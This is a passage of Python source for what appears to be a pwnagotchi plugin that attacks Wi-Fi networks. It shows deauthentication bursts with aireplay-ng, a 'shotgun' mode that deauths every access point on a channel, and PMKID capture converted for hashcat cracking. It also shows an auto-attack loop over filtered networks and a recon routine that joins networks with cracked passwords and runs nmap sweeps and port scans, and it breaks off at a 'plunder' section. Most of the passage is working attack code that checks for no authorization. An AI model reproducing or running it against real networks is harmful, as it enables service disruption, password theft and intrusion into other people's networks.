        Check temp_dir for captured handshakes and copy them to handshake_dir.
        Uses aircrack-ng to verify captures contain handshakes.
        """
        try:
            # Find all pcap files in temp dir.
            pcap_files = glob.glob(os.path.join(temp_dir, "passive-*.cap"))

            for pcap in pcap_files:
                # Run aircrack-ng to check if this pcap contains a handshake.
                result = self._run(
                    ["aircrack-ng", pcap],
                    check=False,
                    timeout=10,
                )

                if result and "1 handshake" in result.lower():
                    # Extract BSSID from filename or aircrack output.
                    # Format: passive-01.cap
                    # We need to parse the BSSID from aircrack-ng output.
                    bssid_match = re.search(r"([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})", result)
                    if bssid_match:
                        bssid = bssid_match.group(1).replace(":", "").lower()
                        # Copy to handshake directory with pwnagotchi naming convention.
                        dest_name = "%s_%d.pcap" % (bssid, int(time.time()))
                        dest_path = os.path.join(handshake_dir, dest_name)

                        # Only copy if it doesn't already exist.
                        if not os.path.exists(dest_path):
                            shutil.copy2(pcap, dest_path)
                            self._passive_handshakes += 1
                            self._log_passive("✓ captured handshake: %s → %s" % (bssid, dest_name))
                            # Add to new handshakes for toast notification.
                            self._new_handshakes.append(dest_name)

                    # Delete the temp pcap after processing.
                    try:
                        os.remove(pcap)
                    except Exception:
                        pass

        except Exception as e:
            self._log_passive("handshake check error: %s" % str(e))

    def _update_network_list_from_passive(self, temp_dir):
        """
        Parse the CSV from passive monitor and update the network list.
        This maintains _last_scan_results with networks detected by the passive monitor.
        """
        try:
            # Find the most recent CSV file.
            csv_files = glob.glob(os.path.join(temp_dir, "passive-*.csv"))
            if not csv_files:
                return

            # Use the most recently modified CSV.
            csv_path = max(csv_files, key=os.path.getmtime)

            # Parse the CSV using the existing parser.
            networks = self._parse_airodump_csv(csv_path)

            if networks:
                # Update the scan results with passive monitor data.
                # This allows the UI to show networks without manual scanning.
                with self._lock:
                    self._last_scan_results = networks
                    # Clear any scan error since we have fresh data.
                    self._last_scan_error = None

                # Log network count periodically.
                total = len(networks)
                with_clients = len([n for n in networks if n.get("clients", 0) > 0])
                self._log_passive("networks: %d total, %d with clients" % (total, with_clients))

        except Exception as e:
            self._log_passive("network list update error: %s" % str(e))

    # ------------------------------------------------------------------ CSV

    @staticmethod
    def _parse_airodump_csv(path):
        """
        airodump CSVs are two sections separated by an empty line:
        first APs, then stations. Returns a list of AP dicts with
        an aggregated 'clients' count.
        """
        with open(path, "r", errors="replace") as f:
            text = f.read()

        parts = re.split(r"\r?\n\s*\r?\n", text, maxsplit=1)
        ap_block = parts[0] if parts else ""
        st_block = parts[1] if len(parts) > 1 else ""

        aps = []
        ap_reader = csv.reader(ap_block.splitlines())
        header_seen = False
        for row in ap_reader:
            if not row or len(row) < 14:
                continue
            if not header_seen:
                if row[0].strip().upper() == "BSSID":
                    header_seen = True
                continue
            bssid = row[0].strip()
            channel = row[3].strip()
            privacy = row[5].strip() if len(row) > 5 else ""
            cipher = row[6].strip() if len(row) > 6 else ""
            auth = row[7].strip() if len(row) > 7 else ""
            power = row[8].strip()
            essid = row[13].strip()
            if not bssid or bssid.upper() == "BSSID":
                continue
            try:
                channel_i = int(channel)
            except ValueError:
                channel_i = 0
            try:
                power_i = int(power)
            except ValueError:
                power_i = -100
            # Build a concise security label from the CSV fields.
            enc = privacy or "OPN"
            if cipher and cipher not in ("", privacy):
                enc += "/" + cipher
            if auth and auth not in ("", privacy, cipher):
                enc += " " + auth
            aps.append({
                "bssid": bssid,
                "channel": channel_i,
                "power": power_i,
                "ssid": essid or "<hidden>",
                "clients": 0,
                "encryption": enc,
            })

        # Count stations whose "BSSID" column maps to one of our APs.
        ap_index = {a["bssid"].lower(): a for a in aps}
        st_reader = csv.reader(st_block.splitlines())
        header_seen = False
        for row in st_reader:
            if not row or len(row) < 6:
                continue
            if not header_seen:
                if row[0].strip().upper() == "STATION MAC":
                    header_seen = True
                continue
            assoc_bssid = row[5].strip().lower()
            if assoc_bssid in ap_index:
                ap_index[assoc_bssid]["clients"] += 1

        # Sort strictly by RSSI (strongest first). airodump uses -1 as a
        # "no recent signal" sentinel; push those to the bottom by treating
        # them as -100 for ordering purposes.
        def _rank(a):
            p = a["power"]
            if p == -1:
                p = -100
            return -p
        aps.sort(key=_rank)
        return aps

    # ------------------------------------------------------------------ attack

    def _start_attack(self, bssid, channel, ssid):
        with self._lock:
            if self._action_running or self._recon_running:
                return False, "an attack/recon is already running"
            if self._agent is None:
                return False, "agent not ready yet"
            self._action_running = True
            self._action_log = []
            self._action_thread = threading.Thread(
                target=self._attack_worker,
                args=(bssid, int(channel), ssid),
                daemon=True,
            )
            self._action_thread.start()
            return True, "attack queued"

    def _start_shotgun(self, channel):
        """Deauth every BSSID currently visible on `channel`, listen for handshakes."""
        with self._lock:
            if self._action_running or self._recon_running:
                return False, "an attack/recon is already running"
            if self._agent is None:
                return False, "agent not ready yet"
            self._action_running = True
            self._action_log = []
            self._action_thread = threading.Thread(
                target=self._shotgun_worker,
                args=(int(channel),),
                daemon=True,
            )
            self._action_thread.start()
            return True, "shotgun queued"

    def _log_action(self, msg):
        ts = time.strftime("%H:%M:%S")
        line = "[%s] %s" % (ts, msg)
        self._action_log.append(line)
        if len(self._action_log) > 200:
            self._action_log = self._action_log[-200:]
        logging.info("[wd_scanner] %s", msg)

    def _shotgun_worker(self, channel):
        """
        Channel-shotgun: pin the aux radio to channel, fire a deauth burst at every BSSID
        we've seen on this channel (subset of self._last_scan_results), then
        sleep `shotgun_listen_seconds` so passive monitor can capture any reauth
        handshakes. Uses aux radio (radio 2) for attacks.
        """
        agent = self._agent
        try:
            # Use the aux radio (radio 2) for attacks.
            attack_iface = self._mon_iface or self._iface_cfg
            if not attack_iface:
                self._log_action("ERROR: no aux radio available for shotgun attack")
                return

            targets = [
                a for a in (self._last_scan_results or [])
                if int(a.get("channel") or 0) == int(channel)
            ]
            if not targets:
                self._log_action(
                    "shotgun ch%d: no BSSIDs known on this channel"
                    % channel
                )
                return

            self._log_action(
                "shotgun ch%d: %d targets, %d bursts each, %ds capture window"
                % (channel, len(targets), self._shotgun_burst_per_bssid,
                   self._shotgun_listen_seconds)
            )

            # Pin aux radio to target channel.
            try:
                self._run(["iw", "dev", attack_iface, "set", "channel", str(channel)],
                          check=False, timeout=5)
                self._log_action("aux radio %s pinned to channel %d" % (attack_iface, channel))
            except Exception as e:
                self._log_action("channel pin failed: %s" % e)
                return

            handshake_dir = self._handshake_dir()
            before = self._snapshot_handshakes(handshake_dir)

            # Round-robin the bursts so every BSSID gets an early hit, rather
            # than blasting one BSSID 3x then the next 3x. This wakes more
            # clients in parallel.
            for round_idx in range(self._shotgun_burst_per_bssid):
                for ap in targets:
                    bssid = ap["bssid"]
                    try:
                        # Use aireplay-ng for deauth from aux radio.
                        cmd = ["aireplay-ng", "-0", "5", "-a", bssid, attack_iface]
                        self._run(cmd, check=False, timeout=10)
                        self._log_action(
                            "ch%d burst %d/%d -> %s (%s)"
                            % (channel, round_idx + 1,
                               self._shotgun_burst_per_bssid,
                               bssid, ap.get("ssid") or "?")
                        )
                    except Exception as e:
                        self._log_action("deauth error %s: %s" % (bssid, e))
                    # tiny gap between BSSIDs so we don't drown each other
                    time.sleep(0.25)
                time.sleep(1)

            self._log_action(
                "shotgun ch%d: listening %ds for reauths (dir=%s)"
                % (channel, self._shotgun_listen_seconds, handshake_dir)
            )
            self._log_action("passive monitor (radio 3) capturing, aux radio (radio 2) attacking")
            time.sleep(self._shotgun_listen_seconds)
            after = self._snapshot_handshakes(handshake_dir)
            new = sorted(set(after) - set(before))
            if new:
                for n in new:
                    self._log_action("captured handshake: %s" % n)
                self._new_handshakes.extend(new)
            else:
                self._log_action("shotgun ch%d: no new handshakes" % channel)
        finally:
            # No need to release channel on pwnagotchi main radio since we didn't touch it.
            self._log_action("shotgun complete, pwnagotchi's main radio was not disturbed")
            self._action_running = False

    def _attack_worker(self, bssid, channel, ssid):
        agent = self._agent
        try:
            # Use PMKID attack if enabled and available.
            if self._pmkid_attack_mode and self._pmkid_available:
                self._pmkid_attack(bssid, channel, ssid)
                return

            # Use the aux radio (radio 2) for attacks, not pwnagotchi's main radio.
            attack_iface = self._mon_iface or self._iface_cfg
            if not attack_iface:
                self._log_action("ERROR: no aux radio available for attack")
                self._log_action("Please select an aux radio from the web UI first")
                return

            self._log_action("using aux radio %s for attack on ch%d -> %s (%s)"
                             % (attack_iface, channel, ssid, bssid))

            # Set the aux radio to the target channel.
            try:
                self._run(["iw", "dev", attack_iface, "set", "channel", str(channel)],
                          check=False, timeout=5)
                self._log_action("aux radio pinned to channel %d" % channel)
            except Exception as e:
                self._log_action("channel pin failed: %s" % e)
                return

            handshake_dir = self._handshake_dir()
            before = self._snapshot_handshakes(handshake_dir)

            # Start airodump-ng on passive monitor to capture handshakes on this channel.
            # The passive monitor (radio 3) is already running and will pick up handshakes.
            # We just need to send deauths from the aux radio (radio 2).

            # Send deauth bursts using aireplay-ng on the aux radio.
            for i in range(self._deauth_bursts):
                try:
                    # Use aireplay-ng for deauth: -0 (deauth) count, -a (AP), interface
                    # Send 10 deauth packets per burst.
                    cmd = ["aireplay-ng", "-0", "10", "-a", bssid, attack_iface]
                    self._run(cmd, check=False, timeout=10)
                    self._log_action("deauth burst %d/%d -> %s (10 packets)"
                                     % (i + 1, self._deauth_bursts, bssid))
                except Exception as e:
                    self._log_action("deauth error: %s" % e)
                time.sleep(2)

            self._log_action(
                "listening %ds for handshakes on channel %d (dir=%s)"
                % (self._listen_seconds, channel, handshake_dir)
            )
            self._log_action("passive monitor (radio 3) capturing, aux radio (radio 2) attacking")
            time.sleep(self._listen_seconds)

            after = self._snapshot_handshakes(handshake_dir)
            new = sorted(set(after) - set(before))
            if new:
                for n in new:
                    self._log_action("captured handshake: %s" % n)
                self._new_handshakes.extend(new)
            else:
                self._log_action("no new handshake files appeared in %s" % handshake_dir)
                self._log_action("tip: ensure passive monitor (radio 3) is running")
        finally:
            # No need to release channel pin on pwnagotchi's main radio since we didn't touch it.
            self._log_action("attack complete, pwnagotchi's main radio was not disturbed")
            self._action_running = False

    def _pmkid_attack(self, bssid, channel, ssid):
        """PMKID attack using hcxdumptool."""
        self._log_action("PMKID attack mode: targeting %s (%s) on ch%d" % (ssid, bssid, channel))

        iface = self._mon_iface or self._iface_cfg
        if not iface:
            self._log_action("ERROR: no interface available for PMKID attack")
            return

        handshake_dir = self._handshake_dir()
        pcapng_file = os.path.join(handshake_dir, "wd_pmkid_%s_%d.pcapng" % (
            bssid.replace(":", ""), int(time.time())
        ))

        try:
            self._log_action("running hcxdumptool on %s for 60s..." % iface)
            self._log_action("  output: %s" % pcapng_file)

            # Run hcxdumptool to capture PMKID.
            proc = subprocess.Popen([
                "hcxdumptool",
                "-i", iface,
                "-o", pcapng_file,
                "--enable_status=1",
                "--filterlist_ap=%s" % bssid,
                "--filtermode=2",
            ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

            # Let it run for 60 seconds.
            time.sleep(60)
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()

            self._log_action("hcxdumptool capture complete")

            # Convert to hashcat format using hcxpcapngtool.
            if os.path.exists(pcapng_file):
                hash_file = pcapng_file.replace(".pcapng", ".hc22000")
                self._log_action("converting to hashcat format: %s" % hash_file)
                result = self._run([
                    "hcxpcapngtool",
                    "-o", hash_file,
                    pcapng_file
                ], check=False, timeout=30)

                if os.path.exists(hash_file):
                    self._log_action("PMKID captured: %s" % os.path.basename(hash_file))
                    self._new_handshakes.append(os.path.basename(hash_file))
                else:
                    self._log_action("no PMKID found for %s" % bssid)
            else:
                self._log_action("ERROR: capture file not created")
        except Exception as e:
            self._log_action("PMKID attack failed: %s" % e)

    def _trigger_auto_attack(self):
        """Auto-attack all networks seen in last scan that match filters."""
        threading.Thread(target=self._auto_attack_worker, daemon=True).start()

    def _auto_attack_worker(self):
        """Sequential auto-attack worker."""
        targets = self._last_scan_results or []
        for ap in targets:
            bssid = ap.get("bssid")
            if not bssid or bssid in self._auto_attack_history:
                continue

            # Apply filters.
            if not self._matches_filters(ap):
                continue

            self._auto_attack_history.add(bssid)
            channel = ap.get("channel")
            ssid = ap.get("ssid", "")

            logging.info("[wd_scanner] auto-attack: %s (%s) ch%s", ssid, bssid, channel)

            # Wait for any running attack to finish.
            while self._action_running:
                time.sleep(1)

            # Start attack.
            self._start_attack(bssid, channel, ssid)

            # Wait for it to complete before next target.
            while self._action_running:
                time.sleep(1)

    def _matches_filters(self, ap):
        """Check if AP matches current filters."""
        # Signal strength filter.
        power = ap.get("power", -100)
        if power < self._filter_min_signal:
            return False

        # Client count filter.
        clients = ap.get("clients", 0)
        if clients < self._filter_min_clients:
            return False

        # Security type filter.
        if self._filter_security:
            sec = ap.get("security", "")
            if sec not in self._filter_security:
                return False

        # Hide pwned networks filter.
        if self._filter_hide_pwned:
            bssid = ap.get("bssid", "").lower()
            cracked = self._load_cracked_index()
            ssid = ap.get("ssid", "")
            if cracked.get(bssid) or cracked.get("ssid::" + ssid.lower()):
                return False

        return True

    # -------------------------------------------------------------- recon

    def _log_recon(self, msg):
        ts = time.strftime("%H:%M:%S")
        line = "[%s] %s" % (ts, msg)
        self._recon_log.append(line)
        if len(self._recon_log) > 400:
            self._recon_log = self._recon_log[-400:]
        # Also surface recon activity in the main action log so the
        # scanner page shows what's happening without navigating away.
        self._action_log.append("[recon] %s" % msg)
        if len(self._action_log) > 200:
            self._action_log = self._action_log[-200:]
        logging.info("[wd_scanner.recon] %s", msg)

    def _start_recon(self, ssid, bssid, password):
        """Connect to a known-pwned network and run a recon sweep."""
        with self._lock:
            # Safety: if _recon_running is stuck from a crashed thread,
            # check whether the thread is actually still alive.
            if self._recon_running and self._recon_thread and not self._recon_thread.is_alive():
                logging.warning("[wd_scanner] _recon_running was stuck True; resetting")
                self._recon_running = False
            if self._action_running or self._recon_running:
                return False, "an attack/recon is already running"
            if not password or password == "<recovered>":
                return False, "no password on file for this network"
            self._recon_running = True
            self._recon_log = []
            self._recon_thread = threading.Thread(
                target=self._recon_worker,
                args=(ssid, bssid, password),
                daemon=True,
            )
            self._recon_thread.start()
            return True, "recon queued"

    def _pick_recon_iface(self):
        """
        Decide which physical interface we'll use for recon. We need a
        managed-mode capable iface. Strategy:
          - Prefer a dedicated radio (not the one bettercap is on, not
            scanning, and not running passive monitor).
          - If only scanning radio available, use it (we'll handle the transition).
          - Otherwise fall back to whatever phy backs pwnagotchi's main
            radio: take down the monitor vif, bring the parent up in
            managed mode.

        Returns (iface_name, was_shared, is_scan_iface) or (None, None, False) on failure.
        """
        main_iface = pwnagotchi_config_main_iface()
        main_phy = self._iface_phy(main_iface) if main_iface else None

        # Build set of interfaces currently in use (scanning + passive monitor).
        busy_ifaces = set()
        if self._mon_iface:
            busy_ifaces.add(self._mon_iface)
        if self._iface_cfg:
            busy_ifaces.add(self._iface_cfg)
        if self._passive_iface_cfg:
            busy_ifaces.add(self._passive_iface_cfg)
        if self._passive_mon_iface:
            busy_ifaces.add(self._passive_mon_iface)

        # Look for a dedicated radio first (not used for scanning or passive).
        for it in self._list_wireless_ifaces():
            iface_name = it.get("name")
            if iface_name in busy_ifaces:
                continue
            if not it.get("shared") and iface_name != main_iface:
                return iface_name, False, False

        # If we have a scanning interface, use it (temporarily take it over).
        # Use the actual monitor vif if airmon-ng renamed it (e.g. wlan1mon).
        if self._iface_cfg:
            actual = self._mon_iface if self._mon_iface else self._iface_cfg
            return actual, self._shared_radio, True

        # Fall back to the parent of pwnagotchi's monitor vif.
        # main_iface is usually `mon0`; we want the parent (`wlan0`).
        if main_phy:
            try:
                for n in os.listdir("/sys/class/net"):
                    if not os.path.exists("/sys/class/net/%s/phy80211" % n):
                        continue
                    if n == main_iface:
                        continue
                    if self._iface_phy(n) == main_phy:
                        return n, True, False
            except OSError:
                pass

        # Last resort: use the main iface itself.
        if main_iface:
            return main_iface, True, False
        return None, None, False

    @staticmethod
    def _wpa_psk_safe(s):
        # wpa_supplicant config string. Quote-it-yourself style; we just
        # refuse anything containing a quote or newline.
        return s and "\"" not in s and "\n" not in s and "\r" not in s

    def _recon_worker(self, ssid, bssid, password):
        """Body of the recon job. Runs in its own thread."""
        try:
            self._recon_worker_inner(ssid, bssid, password)
        except Exception as e:
            logging.exception("[wd_scanner] recon worker crashed")
            try:
                self._log_recon("FATAL: recon worker crashed: %s" % e)
            except Exception:
                pass
        finally:
            self._recon_running = False

    def _recon_worker_inner(self, ssid, bssid, password):
        """Actual recon logic, called from _recon_worker."""
        agent = self._agent
        self._log_recon(">>> RECON STARTED — target SSID=%s BSSID=%s" % (ssid, bssid))
        self._log_debug("recon_worker started: ssid=%s, bssid=%s" % (ssid, bssid))

        self._log_recon("selecting interface for recon...")
        self._log_debug("calling _pick_recon_iface()")
        try:
            iface, was_shared, is_scan_iface = self._pick_recon_iface()
            self._log_debug("_pick_recon_iface returned: iface=%s, was_shared=%s, is_scan_iface=%s" %
                          (iface, was_shared, is_scan_iface))
        except Exception as e:
            self._capture_exception("_pick_recon_iface")
            self._log_recon("ABORT: exception in interface selection: %s" % e)
            self._recon_running = False
            return

        if not iface:
            self._log_recon("ABORT: no usable interface for recon")
            self._log_debug("no interface available: _mon_iface=%s, _iface_cfg=%s" %
                          (self._mon_iface, self._iface_cfg))
            self._recon_running = False
            return

        if is_scan_iface:
            self._log_recon("recon iface selected: %s [SCAN IFACE — will temporarily take over]" % iface)
        else:
            self._log_recon("recon iface selected: %s%s" % (
                iface, " [SHARED — pwnagotchi will pause]" if was_shared else " [DEDICATED]"
            ))

        # Tooling check.
        self._log_recon("checking required tools...")
        if not shutil.which("wpa_supplicant") or not shutil.which("dhclient"):
            self._log_recon("ABORT: wpa_supplicant/dhclient missing — install wpasupplicant + isc-dhcp-client")
            self._recon_running = False
            return
        if not shutil.which("nmap"):
            self._log_recon("WARNING: nmap not on PATH; install with `apt-get install nmap`")
        self._log_recon("tools OK: wpa_supplicant=%s dhclient=%s nmap=%s" % (
            shutil.which("wpa_supplicant"), shutil.which("dhclient"),
            shutil.which("nmap") or "MISSING"
        ))

        if not self._wpa_psk_safe(password):
            self._log_recon("ABORT: password contains illegal characters (quote/newline)")
            self._recon_running = False
            return

        # Build the config file.
        self._log_recon("preparing wpa_supplicant config...")
        tmpdir = tempfile.mkdtemp(prefix="wd_recon_")
        wpa_conf = os.path.join(tmpdir, "wpa_supplicant.conf")
        wpa_pid = os.path.join(tmpdir, "wpa_supplicant.pid")
        wpa_ctrl = os.path.join(tmpdir, "ctrl")
        dhcp_pid = os.path.join(tmpdir, "dhclient.pid")
        dhcp_lease = os.path.join(tmpdir, "dhclient.leases")

        try:
            os.makedirs(wpa_ctrl, exist_ok=True)
        except OSError:
            pass
        try:
            with open(wpa_conf, "w") as f:
                f.write(
                    "ctrl_interface=" + wpa_ctrl + "\n"
                    "update_config=0\n"
                    "network={\n"
                    "  ssid=\"" + ssid + "\"\n"
                    "  psk=\"" + password + "\"\n"
                    "  scan_ssid=1\n"
                    "  key_mgmt=WPA-PSK\n"
                    "}\n"
                )
            os.chmod(wpa_conf, 0o600)
            self._log_recon("wpa config written to %s (mode 600)" % wpa_conf)
        except OSError as e:
            self._log_recon("ABORT: couldn't write wpa config: %s" % e)
            self._recon_running = False
            return

        result = {
            "ts": int(time.time()),
            "ssid": ssid,
            "bssid": bssid,
            "iface": iface,
            "ip": None,
            "gateway": None,
            "subnet": None,
            "alive_hosts": [],
            "ports": {},        # ip -> [open ports]
            "names": {},         # ip -> reverse DNS
            "log": [],
            "duration_seconds": 0,
        }

        t0 = time.time()
        bettercap_paused_here = False
        wpa_started = False

        try:
            # 1. Pause pwnagotchi/bettercap so the radio is free for managed.
            self._log_recon("step 1/7: pausing bettercap wifi.recon...")
            try:
                agent.run("wifi.recon off")
                self._log_recon("  bettercap recon PAUSED — radio released")
                bettercap_paused_here = True
            except Exception as e:
                self._log_recon("  WARNING: could not pause bettercap: %s" % e)

            # If our iface is currently a monitor vif, we need to get back to the parent.
            # If it's a "mon" interface created by airmon-ng, stop it to get parent back.
            self._log_debug("checking if interface '%s' is monitor mode" % iface)
            parent_iface = iface
            if "mon" in iface.lower():
                self._log_recon("step 2/7: detected monitor interface %s, stopping to get parent..." % iface)
                self._log_debug("running: airmon-ng stop %s" % iface)
                try:
                    stop_result = self._run(["airmon-ng", "stop", iface], check=False, timeout=10)
                    self._log_recon("  airmon-ng stop output: %s" % stop_result[:200] if stop_result else "")
                    self._log_debug("airmon-ng stop complete")
                except Exception as e:
                    self._capture_exception("airmon-ng stop")
                    self._log_recon("  ERROR in airmon-ng stop: %s" % e)
                # Extract parent interface name (usually the original name without "mon").
                # e.g., "wlan1mon" -> "wlan1"
                parent_iface = iface.replace("mon", "")
                self._log_recon("  parent interface: %s" % parent_iface)
                self._log_debug("parent_iface=%s" % parent_iface)
                iface = parent_iface

            # Ensure the interface is down, in managed mode, and back up.
            self._log_recon("step 2b/7: switching %s to managed mode..." % iface)
            try:
                self._run(["ip", "link", "set", iface, "down"], check=False, timeout=5)
                self._log_recon("  %s brought DOWN" % iface)
                self._run(["iw", "dev", iface, "set", "type", "managed"],
                          check=False, timeout=5)
                self._log_recon("  %s set to MANAGED mode" % iface)
                self._run(["ip", "link", "set", iface, "up"], check=False, timeout=5)
                self._log_recon("  %s brought UP in managed mode" % iface)
            except Exception as e:
                self._capture_exception("interface mode switch")
                self._log_recon("  ERROR in mode switch: %s" % e)

            # 2. Start wpa_supplicant in the background.
            self._log_recon("step 3/7: starting wpa_supplicant...")
            self._log_recon("  cmd: wpa_supplicant -B -D nl80211,wext -i %s -c %s" % (iface, wpa_conf))
            self._log_recon("  connecting to SSID '%s' with known PSK..." % ssid)
            wpa_result = self._run([
                "wpa_supplicant",
                "-B",
                "-D", "nl80211,wext",
                "-i", iface,
                "-c", wpa_conf,
                "-P", wpa_pid,
            ], check=False, timeout=10)
            wpa_started = True
            self._log_recon("  wpa_supplicant launched (pid file: %s)" % wpa_pid)
            if wpa_result:
                self._log_recon("  wpa output: %s" % wpa_result.strip()[:200])

            # Brief pause to allow association to complete.
            time.sleep(2)
            self._log_recon("  waiting for WPA association to complete...")

            # 3. dhclient.  Use -1 (try once) and let the subprocess
            #    timeout handle the dwell — ISC dhclient 4.4 doesn't
            #    accept -timeout / --timeout in many builds.
            self._log_recon("step 4/7: requesting DHCP lease on %s (timeout %ds)..." % (iface, self._recon_dwell))
            self._log_recon("  cmd: dhclient -1 %s" % iface)
            dhcp_result = self._run([
                "dhclient",
                "-pf", dhcp_pid,
                "-lf", dhcp_lease,
                "-1",
                iface,
            ], check=False, timeout=self._recon_dwell + 5)
            if dhcp_result:
                self._log_recon("  dhclient output: %s" % dhcp_result.strip()[:200])

            ip = self._iface_ipv4(iface)
            gw = self._iface_default_gw()
            if not ip:
                self._log_recon("ABORT: no IPv4 address acquired after %ds — AP may have rejected us or DHCP timed out" % self._recon_dwell)
                self._log_recon("  (try increasing recon_dhcp_dwell in config.toml)")
                return
            result["ip"], result["gateway"] = ip, gw
            self._log_recon("  CONNECTED! our IP: %s | gateway: %s" % (ip, gw or "unknown"))

            # IPs to exclude from scanning/plundering (ourselves).
            self_ips = {ip}
            self._log_recon("  excluding our own IP %s from scan targets" % ip)

            # 4. Compute subnet, capped to /24.
            self._log_recon("step 5/7: deriving network subnet...")
            net_base, net_mask = self._derive_subnet(ip)
            result["subnet"] = "%s/%d" % (net_base, net_mask)
            host_count = (1 << (32 - net_mask)) - 2
            self._log_recon("  subnet: %s/%d (%d possible hosts)" % (net_base, net_mask, host_count))
            if host_count > self._recon_subnet_max:
                self._log_recon(
                    "  WARNING: subnet too large (%d hosts), capping scan to first %d"
                    % (host_count, self._recon_subnet_max)
                )

            # 5. Ping sweep (nmap -sn). Bound by recon_seconds.
            sweep_target = "%s/%d" % (net_base, net_mask)
            sweep_seconds = max(8, self._recon_seconds // 2)
            self._log_recon("step 6/7: nmap ping sweep — discovering alive hosts...")
            self._log_recon("  cmd: nmap -sn -n --max-retries 1 --host-timeout %ds -T4 %s" % (sweep_seconds, sweep_target))
            self._log_recon("  scanning %d addresses (budget: %ds)..." % (host_count, sweep_seconds))
            sweep_out = self._run([
                "nmap", "-sn", "-n",
                "--max-retries", "1",
                "--host-timeout", str(sweep_seconds) + "s",
                "-T4",
                sweep_target,
            ], check=False, timeout=sweep_seconds + 10) or ""
            alive = self._parse_nmap_alive(sweep_out)
            # Always include the gateway if we know it.
            if gw and gw not in alive:
                alive.insert(0, gw)
            # Never scan ourselves.
            alive = [h for h in alive if h not in self_ips]
            alive = alive[: self._recon_subnet_max]
            result["alive_hosts"] = alive
            self._log_recon("  ping sweep complete: %d hosts responded (excluding self)" % len(alive))
            if alive:
                self._log_recon("  alive: %s" % ", ".join(alive[:15]))
                if len(alive) > 15:
                    self._log_recon("  ... and %d more" % (len(alive) - 15))

            # 6. Top-100 fast port scan, capped by remaining budget.
            elapsed = time.time() - t0
            remaining = max(8, self._recon_seconds - elapsed)
            self._log_recon("step 7/7: port scanning alive hosts...")
            self._log_recon("  elapsed so far: %.1fs | remaining budget: %.1fs" % (elapsed, remaining))
            if alive:
                port_seconds = int(remaining)
                per_host_timeout = max(5, port_seconds // max(1, len(alive)))
                self._log_recon("  cmd: nmap -Pn -n -F --open -T4 (top-100 ports)")
                self._log_recon("  scanning %d hosts, %ds per-host timeout, %ds total budget" % (
                    len(alive), per_host_timeout, port_seconds
                ))
                ports_out = self._run([
                    "nmap", "-Pn", "-n", "-F",
                    "--max-retries", "1",
                    "--host-timeout", str(per_host_timeout) + "s",
                    "-T4",
                    "--open",
                ] + alive,
                    check=False, timeout=port_seconds + 15) or ""
                result["ports"] = self._parse_nmap_ports(ports_out)
                # Log per-host port findings.
                if result["ports"]:
                    for h, ports in result["ports"].items():
                        self._log_recon("  %s → open ports: %s" % (h, ", ".join(str(p) for p in ports)))
                else:
                    self._log_recon("  no open ports found on any host")
            else:
                self._log_recon("  no alive hosts to port-scan — skipping")

            # 7. Reverse DNS via gateway.
            self._log_recon("resolving reverse DNS for %d hosts..." % len(alive))
            dns_count = 0
            for host in alive:
                try:
                    name = socket.gethostbyaddr(host)[0]
                    if name and name != host:
                        result["names"][host] = name
                        dns_count += 1
                        self._log_recon("  %s → %s" % (host, name))
                except (socket.herror, socket.gaierror, OSError):
                    pass
            if dns_count == 0:
                self._log_recon("  no reverse DNS names resolved")

            self._log_recon(
                ">>> RECON COMPLETE: %d alive, %d with open ports, %d named (%.1fs)"
                % (len(alive), len(result["ports"]), len(result["names"]),
                   time.time() - t0)
            )
        except Exception as e:
            logging.exception("[wd_scanner] recon failed")
            self._log_recon("EXCEPTION during recon: %s" % e)
        finally:
            # 8. Tear everything down. Targeted only — NEVER kill all
            # wpa_supplicants on the system, that takes down the BT
            # tether/uplink that the user is using to reach this UI.
            self._log_recon("tearing down recon connection...")
            self._log_recon("  releasing DHCP lease on %s..." % iface)
            self._run(["dhclient", "-r", "-pf", dhcp_pid, "-lf", dhcp_lease, iface],
                      check=False, timeout=10)
            if wpa_started:
                self._log_recon("  stopping wpa_supplicant (pid file: %s)..." % wpa_pid)
                # First try the pidfile we just wrote.
                self._run(["pkill", "-F", wpa_pid], check=False, timeout=5)
                # Fallback: only target processes whose argv mentions THIS
                # iface, so we don't touch wpa_supplicant instances running
                # on other interfaces.
                self._run(
                    ["pkill", "-f", r"wpa_supplicant.*-i\s*%s(\s|$)" % re.escape(iface)],
                    check=False, timeout=5,
                )
                self._log_recon("  wpa_supplicant terminated")

            # Restore the iface to monitor mode if it was shared or was our scan iface.
            if was_shared or is_scan_iface:
                self._log_recon("  restoring %s to monitor mode..." % iface)
                self._run(["ip", "link", "set", iface, "down"], check=False, timeout=5)
                self._run(["iw", "dev", iface, "set", "type", "monitor"],
                          check=False, timeout=5)
                self._run(["ip", "link", "set", iface, "up"], check=False, timeout=5)
                self._log_recon("  %s restored to monitor mode" % iface)
                # If this was the scan/aux iface, re-run airmon-ng to get the
                # monitor vif back so the aux picker still works.
                if is_scan_iface and self._iface_cfg:
                    self._log_recon("  re-enabling monitor mode via airmon-ng...")
                    result_am = self._run(
                        ["airmon-ng", "start", iface], check=False, timeout=15
                    )
                    if result_am:
                        m = re.search(
                            r"monitor mode (?:vif )?enabled (?:for|on) (\w+)",
                            result_am, re.I,
                        )
                        if m:
                            self._mon_iface = m.group(1)
                            self._log_recon("  aux monitor restored: %s" % self._mon_iface)

            if bettercap_paused_here:
                self._log_recon("  resuming bettercap wifi.recon...")
                try:
                    agent.run("wifi.recon on")
                    self._log_recon("  bettercap recon RESUMED — pwnagotchi back in control")
                except Exception as e:
                    self._log_recon("  ERROR: could not resume bettercap: %s" % e)

            # 9. Persist the report alongside the handshakes.
            result["duration_seconds"] = round(time.time() - t0, 1)
            result["log"] = list(self._recon_log)
            try:
                fname = self._recon_filename(bssid)
                full = os.path.join(self._handshake_dir(), fname)
                os.makedirs(self._handshake_dir(), exist_ok=True)
                with open(full, "w") as f:
                    json.dump(result, f, indent=2, default=str)
                self._log_recon("report saved: %s" % fname)
            except Exception as e:
                self._log_recon("couldn't save report: %s" % e)

            try:
                shutil.rmtree(tmpdir, ignore_errors=True)
            except Exception:
                pass

            self._log_recon(">>> RECON JOB FINISHED (total %.1fs)" % (time.time() - t0))
            self._recon_running = False

    # -------------------------------------------------------------- plunder

    def _log_plunder(self, msg):
        logging.info("[wd_scanner:plunder] %s", msg)
        self._plunder_log.append(msg)
        if len(self._plunder_log) > 200:
            self._plunder_log = self._plunder_log[-150:]

    def _plunder_dir(self):
